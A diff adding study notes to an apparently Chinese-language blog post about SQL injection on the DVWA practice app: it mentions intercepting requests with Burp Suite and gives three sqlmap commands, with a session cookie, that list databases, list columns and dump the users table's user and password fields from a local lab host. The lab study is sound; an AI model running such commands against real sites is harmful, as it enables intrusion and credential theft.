@@ -87,6 +87,14 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mmzkyl/p/13635956.html">https://www.cnblogs.com/mmzkyl/p/13635956.html</a></p>
+<p>思路：</p>
+<ul>
+<li>用burpsuite拦截请求，修改内容</li>
+<li>把特定符号或内容进行URL编码后发送</li>
+</ul>
+<p>使用<code>sqlmap</code>的一些命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.81.131/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot; --cookie=&quot;acgroupswithpersist=nada;acopendivids=swingset,jotto,phpbb2,redmine;PHPSESSID=i2455v4lbef0rh5faiqbap1da0;security=low&quot; --dbs  # inject with cookie</span><br><span class="line">sqlmap -u &quot;http://192.168.81.131/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot; --cookie=&quot;acgroupswithpersist=nada;acopendivids=swingset,jotto,phpbb2,redmine;PHPSESSID=i2455v4lbef0rh5faiqbap1da0;security=low&quot; --batch -D &quot;dvwa&quot; -T &quot;users&quot; --columns  # get columns of table</span><br><span class="line">sqlmap -u &quot;http://192.168.81.131/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot; --cookie=&quot;acgroupswithpersist=nada;acopendivids=swingset,jotto,phpbb2,redmine;PHPSESSID=i2455v4lbef0rh5faiqbap1da0;security=low&quot; --batch -D &quot;dvwa&quot; -T &quot;users&quot; -C &quot;user,password&quot; --dump  # dump data of designated columns </span><br></pre></td></tr></table></figure>
+
 
       
     </div>
